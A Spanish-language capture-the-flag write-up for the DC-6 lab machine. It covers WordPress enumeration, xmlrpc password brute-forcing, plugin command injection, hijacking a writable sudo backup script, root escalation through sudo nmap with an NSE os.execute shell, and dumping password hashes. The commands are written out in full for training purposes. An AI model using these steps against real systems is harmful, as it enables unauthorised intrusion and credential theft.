-----

Autor: [deeb](https://github.com/tryto-deeb/)
<br>
Dificultad: Fácil
<br>
CTF: [DC-6](https://www.vulnhub.com/entry/dc-6,315/)

-----

Wordpress, Explotación xmlrpc, Command Injection, Credentials-disclosure, script-modification, sudo-abuse, sudo-nmap, hash-dump

-----

<br>

# Enumeración



## Escaneo de puertos


Realizamos un escaneo silencioso para ver que puertos estan abiertos.

```shell
sudo nmap -p- --open -sS -n -Pn --min-rate 5000 192.168.1.45 
```
```output
-- output --
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
<br>

## Escaneo de versiones

Lanzamos escaneo de versiones y una serie de scripts por defecto de nmap para el puerto `22` y `80` 

```shell
nmap -p22,80 -sCV 192.168.1.45 
```
```output
-- output --
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Wordy &#8211; Just another WordPress site
|_http-generator: WordPress 5.1.1
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El **puerto 22** nos muestra la versión de *OpenSSH 7.4p1*. 
En el **puerto 80** hay una aplicación web con el título *Wordy* que parece estar corriendo un *Wordpress* con la versión *5.1.1* .
<br>

### Añadir dominio
<br>

Añadimos el dominio wordy al `/etc/hosts` tal y como nos indican en la descripción de la máquina

```shell
echo '192.168.1.45 wordy' | sudo tee -a /etc/hosts
```
<br>


## Enumeración de versiones
<br>

Con `whatweb` vemos las versiones de las tecnologías que utiliza la web

```shell
whatweb http://wordy
```
```output
-- output --
http://wordy [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.1.45], JQuery[1.12.4], MetaGenerator[WordPress 5.1.1], PoweredBy[WordPress], Script[text/javascript], Title[Wordy &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.1.1]
```
<br>

## Enumeración de Wordpress 
<br>

Lanzamos un escaneo con `wpscan` en busca de temas o plugins que puedan ser vulnerables y enumeramos posibles usuarios de la aplicación.

```shell
wpscan --url http://wordy -e vp,u
```
```output
-- output --
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordy/ [192.168.1.45]
[+] Started: Fri Apr  4 19:19:14 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
...

[+] WordPress readme found: http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```
<br>

Aparentemente no encontramos ningún plugin corriendo en el wordpress. Creamos un archivo `users.txt` ya que el archivo `xmlrpc.php` esta habilitado, eso nos indica que es susceptible a ataques de fuerza bruta en el login.

```txt
admin
jens
graham
mark
sarah
```

<br>


> [!NOTA]
> El creador del ctf nos recomiendo filtrar el diccionario rockyou.txt por las palabras que contengan `k01` si no nos queremos pasar horas aplicando fuerza bruta cuando sea necesario.
> 
> ```shell
> cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
> ```
> 
> 

<br>

## Aplicar Fuerza Bruta al Login
<br>

Podríamos aplicar fuerza bruta mediante un script en bash de forma [manual](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/Stapler/Write-up%20Stapler.md#explotaci%C3%B3n-del-archivo-xmlrpcphp), pero en esta ocasión utilizaremos `wpscan`.

```shell
wpscan --url http://wordy -U users.txt -P passwords.txt
```
```output
-- output --

[+] Performing password attack on Xmlrpc against 5 user/s
[SUCCESS] - mark / helpdesk01                                                                                                                                                                                                         
Trying jens / !lak019b Time: 00:03:28 <============================================================================================================================                            > (12547 / 15215) 82.46%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mark, Password: helpdesk01
```

Encontramos para el usuario **mark** la contraseña *helpdesk01*.

<br>

Nos loggeamos en `http://wordy/wp-login.php` con los credenciales de **mark** para acceder al panel de wordpress. Después de echar un vistazo por el panel nos llama la atención el apartado de *Activity monitor*.

![img_1.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-6/Capturas/img_1.png)

<br>
<br>


# Explotación
<br>


Al buscar en la base de datos de `exploit-db` con `searchsploit` encontramos varios exploits, entre ellos uno que nos permite explotar una vulnerabilidad de **Comand Injection** en el *campo IP* que se encuentra en la pestaña de Tools.

```shell
searchsploit activity monitor
```
```output
-- output --

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                      |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Activity Monitor 2002 2.6 - Remote Denial of Service                                                                                                                                                | windows/dos/22690.c
RedHat Linux 6.0/6.1/6.2 - 'pam_console' Monitor Activity After Logout                                                                                                                              | linux/local/19900.c
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                                                                                                            | php/webapps/45274.html
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)                                                                                              | php/webapps/50110.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
<br>

Podríamos utilizar cualquiera de los dos últimos exploits y nos automatizaría la inyección de comandos , pero en este caso lo haremos de forma manual para entender mejor que es lo que esta sucediendo.

Hacemos una pequeña comprobación inyectando el comando `id` utilizando el operador lógico OR `|` que hará que después de ejecutar el primer comando sobre la IP se ejecute también el comando `id` devolviéndonos la salida del mismo.

![img_2.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-6/Capturas/img_2.png)
<br>

Este campo de entrada IP esta restringido a un número máximo de caracteres que se pueden introducir, lo cual no nos permite utilizar un comando con mas de 5 caracteres. Para saltarnos esta restricción interceptaremos la petición POST con Burpsuite mandándola al Repeater para inyectar cualquier comando de forma más cómoda

Filtramos todos los usuarios del sistema que estan utilizando una bash.

![img_3.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-6/Capturas/img_3.png)
<br>

Después de listar el contenido del directorio `/home` para el usuario mark, encontramos un archivo que parece ser una lista de tareas que hacer, entre las cuales esta la de crear el usuario **graham** con la contraseña *GSo7isUM1D4*

![img_4.png](https://github.com/tryto-deeb/CTF-WriteUps/blob/master/DC-6/Capturas/img_4.png)
<br>
<br>

# Movimiento Lateral
<br>

### Usuario graham

Después de leer el archivo `/home/mark/stuff/things-to-do.txt` y obtener las credenciales conectamos mediante el servicio ssh como el usuario **graham**

User: `graham` password : `GSo7isUM1D4`

```shell
ssh graham@192.168.1.45
```
<br>

Comprobamos que comandos con privilegios podemos ejecutar con sudo

```shell
sudo -l
```
```output
-- output --

Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```
<br>

Vemos que nos deja ejecutar el script `/home/jens/backups` como el usuario **jens** que ejecuta un comando que hace un backup del directorio `/var/www/html` donde se encuentran los archivos del wordpress comprimiéndolos en un archivo `tar.gz`


```shell
cat /home/jens/backups.sh
```
```output
-- output --
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
```
<br>

Comprobamos los permisos del script y vemos que los usuarios que pertenecen al grupo **devs** tienen permiso para poder modificar el contenido del script

```shell
ls -l /home/jens/backups.sh
```
```output
-- output --
-rwxrwxr-x 1 jens devs 60 Apr  5 02:25 /home/jens/backups.sh
```
<br>

El usuario **graham** pertenece al grupo **dev** por lo tanto podemos modificar el script

```shell
groups
```
```output
-- output --
graham devs
```
<br>

Añadimos el comando `/bin/bash` para que al ejecutar el script como el usuario **jens** se ejecute una shell como el usuario jens.

```shell
echo "/bin/bash" >> /home/jens/backups.sh
```
<br>

Ejecutamos el script y obtenemos la shell.

```shell
sudo -u jens /home/jens/backups.sh
```

<br>

## Usuario jens


Volvemos a hacer la misma comprobación y vemos que en este caso **jens** tiene permiso para ejecutar como usuario privilegiado, es decir como **root**, el binario `nmap`

```shell
sudo -l
```
```output
-- output --
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```
<br>

# Escalada de privilegios

Después de buscar en [GTObins](https://gtfobins.github.io/gtfobins/nmap/#sudo) posibles vías de escalada con el comando `sudo` para el binario de `nmap`. Vemos que el binario permite ejecutarse como superusuario por `sudo`, ya que este no elimina los privilegios elevados, esto puede ser utilizado para escalar privilegios. Creamos un script.nse que ejecutará una shell `/bin/bash` y esta se ejecutará como root.

```shell
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```
<br>

Una vez que somos el usuario **root** ya podemos leer la flag que se encuentra en el directorio de `/root`

```shell
cat /root/theflag.txt
```
```output
-- output --

# theflag.txt
# 

Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
<br>
<br>

# Loot


Después de ver el contenido del archivo de configuración de wordpress `wp-config.php` , obtenemos los credenciales para poder conectarnos a la base de datos con `mysql`

```shell
cat /var/www/html/wp-config.php
```

Nos conectamos a la base de datos

```shell
mysql -u wpdbuser -p -h localhost wordpressdb
```

Mostramos las tablas

```mysql
SHOW TABLES;
```
```output
-- output --
+-----------------------+
| Tables_in_wordpressdb |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_pv_am_activities   |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
13 rows in set (0.00 sec)
```
<br>

Obtenemos todos los hashes de las contraseñas de wordpress de todos los usuarios registrados.

```mysql
SELECT * FROM wp_users;
```
```output
-- output --
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email                  | user_url | user_registered     | user_activation_key                           | user_status | display_name    |
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
|  1 | admin      | $P$BDhiv9Y.kOYzAN8XmDbzG00hpbb2LA1 | admin         | blah@blahblahblah1.net.au   |          | 2019-04-24 12:52:10 |                                               |           0 | admin           |
|  2 | graham     | $P$B/mSJ8xC4iPJAbCzbRXKilHMbSoFE41 | graham        | graham@blahblahblah1.net.au |          | 2019-04-24 12:54:57 |                                               |           0 | Graham Bond     |
|  3 | mark       | $P$BdDI8ehZKO5B/cJS8H0j1hU1J9t810/ | mark          | mark@blahblahblah1.net.au   |          | 2019-04-24 12:55:39 |                                               |           0 | Mark Jones      |
|  4 | sarah      | $P$BEDLXtO6PUnSiB6lVaYkqUIMO/qx.3/ | sarah         | sarah@blahblahblah1.net.au  |          | 2019-04-24 12:56:10 |                                               |           0 | Sarah Balin     |
|  5 | jens       | $P$B//75HFVPBwqsUTvkBcHA8i4DUJ7Ru0 | jens          | jens@blahblahblah1.net.au   |          | 2019-04-24 13:04:40 | 1556111080:$P$B5/.DwEMzMFh3bvoGjPgnFO0Qtd3p./ |           0 | Jens Dagmeister |
+----+------------+------------------------------------+---------------+-----------------------------+----------+---------------------+-----------------------------------------------+-------------+-----------------+
5 rows in set (0.00 sec)
```
